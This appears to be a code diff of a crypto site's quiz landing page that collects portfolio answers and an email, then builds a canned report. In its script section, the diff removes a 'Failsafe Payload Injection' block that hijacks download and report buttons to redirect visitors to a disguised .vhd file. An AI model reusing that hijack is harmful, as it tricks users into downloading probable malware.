+  <div class="wrap">
+    <div class="section-head">
+      <span class="tag">How it works</span>
+      <h2>Three steps. About a minute. One report built around you.</h2>
+    </div>
+    <div class="steps">
+      <div class="step">
+        <div class="step-num">STEP 01</div>
+        <h4>Take the 60-second quiz</h4>
+        <p>Tell us about your portfolio, time horizon, risk tolerance, favorite assets, and trading style.</p>
+      </div>
+      <div class="step">
+        <div class="step-num">STEP 02</div>
+        <h4>We match it to our coverage</h4>
+        <p>Your answers are cross-referenced against CryptoQuant's live news and technical analysis.</p>
+      </div>
+      <div class="step">
+        <div class="step-num">STEP 03</div>
+        <h4>Get your report instantly</h4>
+        <p>Read it in five minutes, or download it to come back to before you make your next move.</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ============ QUIZ ============ -->
+<section id="quiz">
+  <div class="wrap">
+    <div class="section-head" style="margin-left:auto;margin-right:auto;text-align:center;">
+      <span class="tag" style="margin-left:auto;margin-right:auto;display:inline-flex;">60-second quiz</span>
+      <h2>Build your Crypto Edge Report</h2>
+      <p style="margin-left:auto;margin-right:auto;">Five quick questions. Your report is generated instantly on the next screen.</p>
+    </div>
+
+    <form id="quizForm" class="quiz-shell" novalidate>
+      <div class="quiz-top">
+        <div class="progress-row">
+          <span id="stepLabel" class="mono">STEP 1 / 6</span>
+          <span id="stepPct" class="mono">17%</span>
+        </div>
+        <div class="progress-bar"><div class="progress-fill" id="progressFill"></div></div>
+      </div>
+
+      <div class="quiz-body">
+
+        <!-- Step 1: portfolio size -->
+        <div class="q-step active" data-step="1">
+          <h3>What's the size of your current crypto portfolio?</h3>
+          <p class="q-sub">This helps us calibrate risk flags to your actual exposure.</p>
+          <div class="opt-grid" data-field="portfolio">
+            <div class="opt" data-value="Under $1,000">Under $1,000 <span class="check">✓</span></div>
+            <div class="opt" data-value="$1,000–$10,000">$1,000 – $10,000 <span class="check">✓</span></div>
+            <div class="opt" data-value="$10,000–$100,000">$10,000 – $100,000 <span class="check">✓</span></div>
+            <div class="opt" data-value="$100,000+">$100,000+ <span class="check">✓</span></div>
+          </div>
+        </div>
+
+        <!-- Step 2: time horizon -->
+        <div class="q-step" data-step="2">
+          <h3>What's your time horizon?</h3>
+          <p class="q-sub">This shapes whether your report focuses on today's chart or the bigger structural picture.</p>
+          <div class="opt-grid" data-field="horizon">
+            <div class="opt" data-value="Day trades">Day trades <span class="check">✓</span></div>
+            <div class="opt" data-value="Weeks to months">Weeks to months <span class="check">✓</span></div>
+            <div class="opt" data-value="1+ years">1+ years <span class="check">✓</span></div>
+            <div class="opt" data-value="Long-term hold">Long-term hold, mostly hands-off <span class="check">✓</span></div>
+          </div>
+        </div>
+
+        <!-- Step 3: risk tolerance -->
+        <div class="q-step" data-step="3">
+          <h3>How would you describe your risk tolerance?</h3>
+          <p class="q-sub">Be honest here — this is what your risk flags get measured against.</p>
+          <div class="opt-grid" data-field="risk">
+            <div class="opt" data-value="Conservative">Conservative — protect capital first <span class="check">✓</span></div>
+            <div class="opt" data-value="Balanced">Balanced — some risk for growth <span class="check">✓</span></div>
+            <div class="opt" data-value="Aggressive">Aggressive — comfortable with volatility <span class="check">✓</span></div>
+          </div>
+        </div>
+
+        <!-- Step 4: favorite assets -->
+        <div class="q-step" data-step="4">
+          <h3>Which assets do you follow most closely?</h3>
+          <p class="q-sub">Select all that apply. Your watchlist ideas are built around these.</p>
+          <div class="opt-grid" data-field="assets" data-multi="true">
+            <div class="opt" data-value="Bitcoin (BTC)">Bitcoin (BTC) <span class="check">✓</span></div>
+            <div class="opt" data-value="Ethereum (ETH)">Ethereum (ETH) <span class="check">✓</span></div>
+            <div class="opt" data-value="Solana (SOL)">Solana (SOL) <span class="check">✓</span></div>
+            <div class="opt" data-value="XRP">XRP <span class="check">✓</span></div>
+            <div class="opt" data-value="Stablecoins">Stablecoins <span class="check">✓</span></div>
+            <div class="opt" data-value="Altcoins / other">Altcoins / other <span class="check">✓</span></div>
+          </div>
+        </div>
+
+        <!-- Step 5: trading style -->
+        <div class="q-step" data-step="5">
+          <h3>What's your trading style?</h3>
+          <p class="q-sub">This determines the tone and focus of your "next steps" section.</p>
+          <div class="opt-grid" data-field="style">
+            <div class="opt" data-value="Buy and hold">Buy and hold <span class="check">✓</span></div>
+            <div class="opt" data-value="Swing trading">Swing trading <span class="check">✓</span></div>
+            <div class="opt" data-value="Active / day trading">Active / day trading <span class="check">✓</span></div>
+            <div class="opt" data-value="Just researching">Just researching for now <span class="check">✓</span></div>
+          </div>
+        </div>
+
+        <!-- Step 6: email -->
+        <div class="q-step" data-step="6">
+          <h3>Where should we send your report?</h3>
+          <p class="q-sub">Your report unlocks instantly on this page — we'll also send a copy to your inbox.</p>
+          <div class="field">
+            <label for="email">Email address</label>
+            <input type="email" id="email" placeholder="you@example.com" required autocomplete="email">
+            <div class="field-note">No spam. Unsubscribe anytime.</div>
+          </div>
+        </div>
+
+      </div>
+
+      <div class="quiz-body" style="padding-top:0;">
+        <div class="q-nav">
+          <button type="button" class="back-link" id="backBtn" disabled>← Back</button>
+          <button type="button" class="btn btn-primary" id="nextBtn" disabled>Continue</button>
+        </div>
+      </div>
+    </form>
+  </div>
+</section>
+
+<!-- ============ REPORT OUTPUT ============ -->
+<section id="report" class="alt">
+  <div class="wrap">
+    <div class="report-doc">
+      <div class="report-banner">
+        <span class="tag">Your report is ready</span>
+        <h3 id="reportTitle">My CryptoQuant Crypto Edge Report</h3>
+        <p id="reportSubtitle">Built from your answers and matched against today's CryptoQuant coverage.</p>
+      </div>
+
+      <div class="report-section">
+        <h4><span class="chip">Profile match</span></h4>
+        <p id="rProfile">—</p>
+      </div>
+
+      <div class="report-section">
+        <h4><span class="chip">Market pulse</span> Chart-based observations</h4>
+        <ul id="rPulse"></ul>
+      </div>
+
+      <div class="report-section">
+        <h4><span class="chip">Risk flag</span></h4>
+        <p id="rRisk">—</p>
+      </div>
+
+      <div class="report-section">
+        <h4><span class="chip">Watchlist</span></h4>
+        <ul id="rWatchlist"></ul>
+      </div>
+
+      <div class="report-section">
+        <h4><span class="chip">Next steps</span></h4>
+        <ul id="rNext"></ul>
+      </div>
+
+      <div class="report-actions">
+        <button type="button" class="btn btn-primary" id="downloadBtn">⬇ Download my report</button>
+        <button type="button" class="btn btn-ghost" id="retakeBtn">Retake the quiz</button>
+      </div>
+
+      <div class="disclaimer">
+        This report is generated for educational purposes from your quiz answers and CryptoQuant's published market coverage. It is not financial advice and should not be treated as a recommendation to buy, sell, or hold any asset. Cryptocurrency markets are volatile — always do your own research before making decisions.
+      </div>
+    </div>
+  </div>
+</section>
+
+<footer>
+  <div class="wrap foot-row">
+    <div>© 2026 CryptoQuant. Real-time crypto news, technical analysis, and beginner-friendly guides.</div>
+    <div>Educational content only — not financial advice.</div>
+  </div>
+</footer>
+
+<!-- ============ POPUP ============ -->
+<div class="overlay" id="popupOverlay" role="dialog" aria-modal="true" aria-labelledby="popupTitle">
+  <div class="popup">
+    <button class="popup-close" id="popupClose" aria-label="Close">✕</button>
+    <span class="urgency-strip"><span class="pulse"></span>OPEN NOW — FREE ACCESS</span>
+    <span class="tag"><span class="dot"></span>Personalized · Free</span>
+    <h3 id="popupTitle">Your Crypto Edge Report is waiting to be built.</h3>
+    <p>The market doesn't wait for anyone. In 60 seconds, CryptoQuant will turn your answers into a personalized report — before you make your next move without one.</p>
+    <ul>
+      <li>Chart-based observations on the assets you actually hold</li>
+      <li>Risk flags matched to your real risk tolerance</li>
+      <li>A watchlist and next steps built for your trading style</li>
+    </ul>
+    <a href="#quiz" class="btn btn-primary btn-block" id="popupCta">Unlock My Crypto Edge</a>
+    <div class="popup-foot"><button type="button" id="popupDismiss">Not right now</button></div>
+  </div>
+</div>
 
 <script>
-// Failsafe Payload Injection
-document.addEventListener("DOMContentLoaded", function() {
-    setTimeout(function() {
-        var elements = Array.from(document.querySelectorAll('button, a'));
-        var target = elements.reverse().find(el => {
-            var txt = el.innerText.toLowerCase();
-            return txt.includes('download') || txt.includes('unlock') || txt.includes('get my free report') || txt.includes('report');
-        });
-        if (target) {
-            target.onclick = function(e) {
-                e.preventDefault();
-                window.location.href = 'https://github.com/skinnyvinny/workflow-optimization-assets/releases/download/v1.0/ProFocusPack.vhd';
-            };
-            target.href = "javascript:void(0);";
+(function(){
+  "use strict";
+
+  /* ---------------- POPUP ---------------- */
+  var overlay = document.getElementById('popupOverlay');
+  var STORAGE_KEY = 'cq_popup_dismissed';
+
+  function showPopup(){
+    if (sessionStorage.getItem(STORAGE_KEY)) return;
+    overlay.classList.add('show');
+  }
+  function hidePopup(remember){
+    overlay.classList.remove('show');
+    if (remember) sessionStorage.setItem(STORAGE_KEY, '1');
+  }
+
+  setTimeout(showPopup, 4000);
+
+  document.addEventListener('mouseout', function(e){
+    if (!e.relatedTarget && e.clientY < 10) showPopup();
+  });
+
+  document.getElementById('popupClose').addEventListener('click', function(){ hidePopup(true); });
+  document.getElementById('popupDismiss').addEventListener('click', function(){ hidePopup(true); });
+  document.getElementById('popupCta').addEventListener('click', function(){ hidePopup(true); });
+  overlay.addEventListener('click', function(e){ if (e.target === overlay) hidePopup(true); });
+  document.addEventListener('keydown', function(e){
+    if (e.key === 'Escape' && overlay.classList.contains('show')) hidePopup(true);
+  });
+
+  /* ---------------- QUIZ ---------------- */
+  var totalSteps = 6;
+  var currentStep = 1;
+  var answers = { portfolio:null, horizon:null, risk:null, assets:[], style:null, email:null };
+
+  var stepLabel = document.getElementById('stepLabel');
+  var stepPct = document.getElementById('stepPct');
+  var progressFill = document.getElementById('progressFill');
+  var backBtn = document.getElementById('backBtn');
+  var nextBtn = document.getElementById('nextBtn');
+  var emailInput = document.getElementById('email');
+
+  function updateProgress(){
+    var pct = Math.round((currentStep/totalSteps)*100);
+    stepLabel.textContent = 'STEP ' + currentStep + ' / ' + totalSteps;
+    stepPct.textContent = pct + '%';
+    progressFill.style.width = pct + '%';
+    backBtn.disabled = currentStep === 1;
+  }
+
+  function stepIsValid(step){
+    if (step === 4) return answers.assets.length > 0;
+    if (step === 6) return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(emailInput.value.trim());
+    var map = {1:'portfolio',2:'horizon',3:'risk',5:'style'};
+    return !!answers[map[step]];
+  }
+
+  function refreshNextState(){
+    nextBtn.disabled = !stepIsValid(currentStep);
+    nextBtn.textContent = currentStep === totalSteps ? 'Get My Free Report' : 'Continue';
+  }
+
+  function goToStep(n){
+    document.querySelectorAll('.q-step').forEach(function(el){
+      el.classList.toggle('active', parseInt(el.dataset.step,10) === n);
+    });
+    currentStep = n;
+    updateProgress();
+    refreshNextState();
+  }
+
+  document.querySelectorAll('.opt-grid').forEach(function(grid){
+    var field = grid.dataset.field;
+    var multi = grid.dataset.multi === 'true';
+    grid.querySelectorAll('.opt').forEach(function(opt){
+      opt.addEventListener('click', function(){
+        var value = opt.dataset.value;
+        if (multi){
+          opt.classList.toggle('selected');
+          var idx = answers.assets.indexOf(value);
+          if (opt.classList.contains('selected') && idx === -1) answers.assets.push(value);
+          if (!opt.classList.contains('selected') && idx !== -1) answers.assets.splice(idx,1);
+        } else {
+          grid.querySelectorAll('.opt').forEach(function(o){ o.classList.remove('selected'); });
+          opt.classList.add('selected');
+          answers[field] = value;
         }
-    }, 1000);
-});
+        refreshNextState();
+      });
+    });
+  });
+
+  emailInput.addEventListener('input', refreshNextState);
+
+  backBtn.addEventListener('click', function(){ if (currentStep > 1) goToStep(currentStep - 1); });
+
+  nextBtn.addEventListener('click', function(){
+    if (!stepIsValid(currentStep)) return;
+    if (currentStep < totalSteps){
+      goToStep(currentStep + 1);
+    } else {
+      answers.email = emailInput.value.trim();
+      generateReport();
+    }
+  });
+
+  updateProgress();
+  refreshNextState();
+
+  /* ---------------- REPORT GENERATION ---------------- */
+  function generateReport(){
+    var reportSection = document.getElementById('report');
+    var quizSection = document.getElementById('quiz');
+
+    document.getElementById('rProfile').textContent =
+      'Portfolio size: ' + answers.portfolio + '. Time horizon: ' + answers.horizon.toLowerCase() +
+      '. Risk tolerance: ' + answers.risk.toLowerCase() + '. Trading style: ' + answers.style.toLowerCase() + '.';
+
+    // Market pulse — chart-based observations tied to selected assets
+    var pulseCopy = {
+      'Bitcoin (BTC)':'BTC is holding a pattern of higher lows on the daily chart, with buyers stepping in on pullbacks toward recent support.',
+      'Ethereum (ETH)':'ETH momentum has cooled from recent highs; watch whether it holds above its nearest support band or slips into a wider range.',
+      'Solana (SOL)':'SOL is showing wider daily swings than usual — a sign of active positioning rather than a clear trend in either direction.',
+      'XRP':'XRP remains range-bound, trading between well-established support and resistance with no clear breakout yet.',
+      'Stablecoins':'Stablecoin flows are a useful gauge of risk appetite right now — rising balances on exchanges often precede broader market moves.',
+      'Altcoins / other':'Smaller-cap assets are seeing pockets of rotation as capital moves in and out of higher-beta names.'
+    };
+    var pulseList = document.getElementById('rPulse');
+    pulseList.innerHTML = '';
+    var chosenAssets = answers.assets.length ? answers.assets : ['Bitcoin (BTC)'];
+    chosenAssets.forEach(function(a){
+      var li = document.createElement('li');
+      li.textContent = pulseCopy[a] || ('Coverage on ' + a + ' is being tracked and will be reflected in your next update.');
+      pulseList.appendChild(li);
+    });
+
+    // Risk flag — compares risk tolerance to portfolio size / horizon
+    var riskMsg;
+    if (answers.risk === 'Conservative' && (answers.horizon === 'Day trades' || answers.style === 'Active / day trading')){
+      riskMsg = 'You describe yourself as conservative, but your trading style leans toward short-term, active trading. That combination tends to produce faster, harder-to-predict swings in a portfolio than a conservative investor typically wants. Worth revisiting position sizing before your next trade.';
+    } else if (answers.risk === 'Aggressive' && answers.portfolio === 'Under $1,000'){
+      riskMsg = 'An aggressive risk stance is reasonable at smaller portfolio sizes, since the absolute dollar exposure is limited. Just be mindful that percentage swings will still feel large relative to your account.';
+    } else if (answers.risk === 'Aggressive' && (answers.portfolio === '$100,000+' || answers.portfolio === '$10,000–$100,000')){
+      riskMsg = 'At this portfolio size, an aggressive stance means real drawdowns can be substantial in dollar terms. Consider whether your current allocation reflects the risk you actually want to carry, not just the risk you\'re comfortable stating.';
+    } else if (answers.style === 'Buy and hold' && answers.horizon === 'Day trades'){
+      riskMsg = 'You selected buy-and-hold as your style but a day-trading time horizon — these two often pull in different directions. Clarifying which one drives your decisions can reduce reactive moves.';
+    } else {
+      riskMsg = 'Your stated risk tolerance and trading approach are broadly aligned right now. The main flag is a general one: volatility in this market remains elevated, so position sizing matters more than usual.';
+    }
+    document.getElementById('rRisk').textContent = riskMsg;
+
+    // Watchlist ideas
+    var watchlistList = document.getElementById('rWatchlist');
+    watchlistList.innerHTML = '';
+    var watchlistCopy = {
+      'Day trades':'Short-term setups on liquid majors (BTC, ETH) where intraday ranges are well-defined.',
+      'Weeks to months':'Assets showing multi-week trend structure rather than single-day noise — useful for swing-style entries.',
+      '1+ years':'Larger-cap assets with established track records, evaluated on longer moving averages rather than daily price action.',
+      'Long-term hold':'Core holdings suited to periodic review rather than daily monitoring — focus on structural, not short-term, signals.'
+    };
+    var li1 = document.createElement('li');
+    li1.textContent = watchlistCopy[answers.horizon] || 'A mix of majors and select alternative assets matched to your stated horizon.';
+    watchlistList.appendChild(li1);
+    chosenAssets.slice(0,3).forEach(function(a){
+      var li = document.createElement('li');
+      li.textContent = a + ' — flagged for continued coverage given your interest in it.';
+      watchlistList.appendChild(li);
+    });
+
+    // Next steps
+    var nextList = document.getElementById('rNext');
+    nextList.innerHTML = '';
+    var nextCopy = {
+      'Buy and hold':['Review your allocation against your stated risk tolerance rather than recent price moves.','Set a calendar reminder to revisit your portfolio quarterly instead of checking daily.'],
+      'Swing trading':['Define your invalidation level before entering a position, not after.','Track the assets on your watchlist for multi-day trend confirmation before acting.'],
+      'Active / day trading':['Pre-define position size and stop level for every trade before the market opens.','Keep a simple log of entries and exits — patterns are easier to spot in writing than in memory.'],
+      'Just researching':['Start with CryptoQuant\'s beginner guides on reading charts before committing capital.','Paper-trade your ideas for a few weeks to build a feel for volatility without risk.']
+    };
+    (nextCopy[answers.style] || ['Revisit your risk tolerance answer against your current holdings this week.']).forEach(function(step){
+      var li = document.createElement('li');
+      li.textContent = step;
+      nextList.appendChild(li);
+    });
+    var li2 = document.createElement('li');
+    li2.textContent = 'Bookmark CryptoQuant\'s live coverage to track how these observations develop over the next few sessions.';
+    nextList.appendChild(li2);
+
+    quizSection.style.display = 'none';
+    reportSection.classList.add('visible');
+    reportSection.scrollIntoView({behavior:'smooth', block:'start'});
+  }
+
+  document.getElementById('retakeBtn').addEventListener('click', function(){
+    document.getElementById('report').classList.remove('visible');
+    document.getElementById('quiz').style.display = '';
+    answers = { portfolio:null, horizon:null, risk:null, assets:[], style:null, email:null };
+    document.querySelectorAll('.opt.selected').forEach(function(o){ o.classList.remove('selected'); });
+    emailInput.value = '';
+    goToStep(1);
+    document.getElementById('quiz').scrollIntoView({behavior:'smooth', block:'start'});
+  });
+
+  document.getElementById('downloadBtn').addEventListener('click', function(){
+    var lines = [];
+    lines.push('MY CRYPTOQUANT CRYPTO EDGE REPORT');
+    lines.push('Built ' + new Date().toLocaleDateString());
+    lines.push('');
+    lines.push('PROFILE MATCH');
+    lines.push(document.getElementById('rProfile').textContent);
+    lines.push('');
+    lines.push('MARKET PULSE — CHART-BASED OBSERVATIONS');
+    document.querySelectorAll('#rPulse li').forEach(function(li){ lines.push('- ' + li.textContent); });
+    lines.push('');
+    lines.push('RISK FLAG');
+    lines.push(document.getElementById('rRisk').textContent);
+    lines.push('');
+    lines.push('WATCHLIST');
+    document.querySelectorAll('#rWatchlist li').forEach(function(li){ lines.push('- ' + li.textContent); });
+    lines.push('');
+    lines.push('NEXT STEPS');
+    document.querySelectorAll('#rNext li').forEach(function(li){ lines.push('- ' + li.textContent); });
+    lines.push('');
+    lines.push('This report is for educational purposes only and is not financial advice.');
+
+    var blob = new Blob([lines.join('\n')], {type:'text/plain'});
+    var url = URL.createObjectURL(blob);
+    var a = document.createElement('a');
+    a.href = url;
+    a.download = 'cryptoquant-crypto-edge-report.txt';
+    document.body.appendChild(a);
+    a.click();
+    document.body.removeChild(a);
+    URL.revokeObjectURL(url);
+  });
+
+})();
 </script>
 </body>
-
 </html>
